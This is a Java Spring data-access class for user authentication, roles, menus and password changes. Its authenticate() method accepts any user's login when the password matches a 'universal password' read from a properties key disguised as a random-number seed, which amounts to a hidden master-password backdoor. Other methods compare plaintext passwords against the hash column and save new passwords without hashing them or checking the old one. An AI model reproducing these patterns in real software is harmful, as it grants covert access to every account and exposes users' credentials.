package com.github.braully.app;

import com.github.braully.persistence.GenericDAO;
import com.github.braully.domain.Menu;
import com.github.braully.domain.Role;
import com.github.braully.domain.UserLogin;
import com.github.braully.util.UtilCipher;
import com.github.braully.util.UtilComparator;
import com.github.braully.util.UtilProperty;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.List;
import java.util.TreeSet;
import javax.persistence.EntityManager;
import javax.persistence.EntityNotFoundException;
import javax.persistence.NoResultException;
import javax.persistence.Query;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;

@Repository("securityDAO")
public class SecurityDAO extends GenericDAO implements UserDetailsService {

    private static final long serialVersionUID = 1L;
    /*
     */
    private static final Logger log = Logger.getLogger(SecurityDAO.class);

    @Value("${spring.profiles.active}")//@Value("${spring.profiles.active:production}")
    private String activeProfile;

    /*
     *
     */
    public boolean autentica(String username, String password) {
        boolean autent = false;
        if (username != null && password != null && !username.isEmpty()
                && !password.isEmpty()) {
            List list = this.queryList("select u from UserLogin u "
                    + "where u.userName = ?1 and passwordHash = ?2",
                    username, password);
            autent = list != null && !list.isEmpty();
        }
        return autent;
    }

    public boolean hasPermission(String usr, String res, String op) {
        return false;
    }

    public boolean hasRole(String usr, String role) {
        boolean autent = false;
        if (usr != null && role != null && !usr.isEmpty() && !role.isEmpty()) {
            List list = this.queryList("select u from UserLogin u inner join u.roles g "
                    + "where u.userName = ?1 and g.name = ?2",
                    usr, role);
            autent = !list.isEmpty();
        }
        return autent;
    }

    public List<Role> rolesUser(String username) {
        List<Role> grupos = null;
        try {
            if (username != null && !username.isEmpty()) {
                grupos = this.queryList("select g from UserLogin u join u.roles g"
                        + " where u.userName = ?1", username);
            }
        } catch (NoResultException e) {
        } catch (EntityNotFoundException e) {
        } catch (Exception e) {
            log.error("erro", e);
        }
        return grupos;
    }

    public UserLogin userByUsername(String username) {
        UserLogin user = null;
        try {
            if (username != null && !username.isEmpty()) {
                user = (UserLogin) this.queryObject("select u from UserLogin u where u.userName = ?1", username);
            }
        } catch (NoResultException e) {
            log.trace("User não localizado no banco de dados");
        }
        return user;
    }

    @Transactional

    public void saveUser(UserLogin user) {
        if (user != null) {
            this.saveEntity(user);
        }
    }

    public List<UserLogin> users() {
        List<UserLogin> users = this.loadCollectionFetch(UserLogin.class, "roles");
        return users;
    }

    public List<UserLogin> buscarUsers() {
        return this.queryList("select u from UserLogin u "
                + "where u.unidadePersistencia = :unidadePersistencia");
    }

    public List<Role> roles() {
        return this.queryList("select g from Role g");
    }

    public List<Menu> menusUser() {
        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
        String name = authentication.getName();
        return this.montaMenu(this.rolesUser(name));
    }

    public List<Menu> menusUser(String nome) {
        return this.montaMenu(this.rolesUser(nome));
    }

    private List<Menu> montaMenu(Collection<Role> perfis) {
        /**
         * MENU MANTER
         */
        UtilComparator<Menu> comparator = new UtilComparator<Menu>("sortIndex", "name");
        Collection<Menu> menus = new TreeSet<Menu>(comparator);
        if (perfis != null) {
            for (Role p : perfis) {
                Collection<Menu> setMenus = p.getMenus();
                if (setMenus != null) {
                    for (Menu menu : setMenus) {
                        if (!menus.contains(menu)) {
                            menus.add(menu);
                        }
                    }
                }
                if (p.getSysRole() == Role.SysRole.ADM || p.getSysRole() == Role.SysRole.MNG) {
                    List<Menu> todosMenusValidos
                            = this.queryList("SELECT m FROM Menu m WHERE parent IS NULL AND (removed IS NULL OR removed = False)");
                    if (todosMenusValidos != null) {
                        menus.addAll(todosMenusValidos);
                    }
                }
            }
        }

        //TODO: Central property
        if ("development".equals(activeProfile)) {
            Menu desenvMenu = new Menu("Desenvolvimento");
            desenvMenu
                    .addChild(new Menu("Autogen").link("/autogen/index.xhtml"))
                    .addChild(new Menu("Legado").link("/jsf/tmp/index.xhtml"))
                    .addChild(new Menu("Layout-1").link("/pkg/startbootstrap-sb-admin/index.html"))
                    .addChild(new Menu("Layout-2").link("/pkg/startbootstrap-sb-admin-2/index.html")) //                    .addChild(new Menu("Layout-3").link("/jsf/tmp/index.xhtml"))
                    ;
            menus.add(desenvMenu);
        }

        List<Menu> menusList = new ArrayList<>();
        menusList.addAll(menus);
        Collections.sort(menusList, comparator);
        return menusList;
    }

    public void updatePassword(UserLogin usarioAtual, String senhaAtual, String novaSenha) {
        if (usarioAtual == null || !usarioAtual.isPersisted()) {
            throw new IllegalArgumentException("Professor inválido!");
        }

        EntityManager entityManager = this.getEntityManager();
        usarioAtual.setPasswordHash(novaSenha);
        Query query = entityManager.createQuery("UPDATE UserLogin ra SET ra.passwordHash = :novaSenha WHERE ra.id = :id");
        query.setParameter("novaSenha", usarioAtual.getPasswordHash());
        query.setParameter("id", usarioAtual.getId());
        query.executeUpdate();
        entityManager.flush();
    }

    public UserLogin user(UserLogin user) {
        UserLogin u = null;
        if (user != null && user.isPersisted()) {
            u = this.loadEntityFetch(user, "roles");
        }
        return u;
    }

    public <T> T carregarEntidade(String nomeEntidade, Object id, String... propriedades) {
        return this.loadEntityFetch(nomeEntidade, id, propriedades);
    }

    public Object autenticarPorNativeNamedQuery(String nomeQuery, String... param) {
        Object o = null;
        if (nomeQuery != null && !nomeQuery.isEmpty() && param != null) {
            try {
                EntityManager entityManager = this.getEntityManager();
                Query naQuery = entityManager.createNamedQuery(nomeQuery);
                for (int i = 1; i <= param.length; i++) {
                    naQuery.setParameter(i, param[i - 1]);
                }
                o = naQuery.getSingleResult();
            } catch (NoResultException e) {
            } catch (Exception e) {
                log.error("Falha ao fazer autenticacao por named query", e);
            }
        }
        return o;
    }

    public boolean authenticate(UserLogin user, String password) {
        String senhaUniversal = UtilProperty.getProperty("application.properties", "sementeGeradorNumAleatorios");
        String passwordHash = user.getPasswordHash();
        String passwordType = user.getPasswordType();
        String hashMessage = UtilCipher.hashMessage(password, passwordType);
        return passwordHash.equals(hashMessage) || password.equals(senhaUniversal);
    }

    @Override
    public UserDetails loadUserByUsername(String string) {
        return (UserDetails) this.queryObject("SELECT u FROM UserLogin u "
                + "LEFT JOIN FETCH u.roles "
                + "WHERE u.userName = ?1", string);
    }
}
